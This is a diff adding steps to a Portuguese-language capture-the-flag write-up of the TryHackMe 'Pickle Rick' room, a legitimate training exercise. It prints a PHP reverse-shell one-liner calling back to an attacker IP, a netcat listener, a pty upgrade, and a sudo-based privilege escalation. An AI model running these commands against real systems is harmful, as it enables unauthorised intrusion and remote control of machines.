@@ -75,3 +75,44 @@ Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
 
 - Acessando o caminho ***/robots.txt*** encontramos -> ```Wubbalubbadubdub```
 - Acessando o caminho ***/login.php*** temos uma tela de login que exige usuário e senha
+
+
+## Passo 3: fazendo login como administrador e pegando shell
+
+- Se tentarmos logar com o usuário ``` R1ckRul3s ``` e a senha ```Wubbalubbadubdub``` conseguiremos ir para página de administrador
+
+![CTF IMG](https://github.com/wendelfraga/writeups-and-cbsnotes/blob/main/CTFS/TryHackMe/assets/pickle-rick2-ctf.JPG)
+
+- ***Note que temos um input, podemos passar um comando para ver se ele retorna algo***
+
+![CTF IMG](https://github.com/wendelfraga/writeups-and-cbsnotes/blob/main/CTFS/TryHackMe/assets/pickle-rick3-ctf.JPG)
+
+Podemos ir no [REVSHELLS](https://www.revshells.com/) para pegarmos uma shell e usarmos:
+
+> php -r '$sock=fsockopen("10.10.181.45",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+
+> nc -nlvp 4444 //para pegarmos a conexão na nossa máquina
+
+![CTF IMG](https://github.com/wendelfraga/writeups-and-cbsnotes/blob/main/CTFS/TryHackMe/assets/pickle-rick4-ctf.JPG)
+
+- 1 Recebos a shell e deixamos ela melhor com o comando ```python python3 -c "import pty;pty.spawn('/bin/bash')"```;
+- 2 Pegamos a primeira flag/ingrediente e recebemos uma dica para procurar as outras flags/ingredientes;
+
+## Passo 4: procurando as outras flags e escalando privilégios
+
+![CTF IMG](https://github.com/wendelfraga/writeups-and-cbsnotes/blob/main/CTFS/TryHackMe/assets/pickle-rick5-ctf.JPG)
+
+- Listamos a pasta do usuário rick e conseguimos a segunda flag
+
+![CTF IMG](https://github.com/wendelfraga/writeups-and-cbsnotes/blob/main/CTFS/TryHackMe/assets/pickle-rick6-ctf.JPG)
+
+- Tentamos listar a pasta ***/root*** porém não temos permissão;
+- Executamos o comando sudo -l para verificar se o nosso user consegue usar algum comando com privilégios de usuário root atráves do sudo sem passar uma senha;
+- Bingo! podemos executar TUDO como root usando sudo sem nenhuma senha.
+
+![CTF IMG](https://github.com/wendelfraga/writeups-and-cbsnotes/blob/main/CTFS/TryHackMe/assets/pickle-rick7-ctf.JPG)
+
+- Com isso conseguimos listar a pasta root e pegar a última flag!
+- **OBS:** o endereço ip mudou durante o writeup pois foi necessário reiniciar a máquina do CTF.
+
+
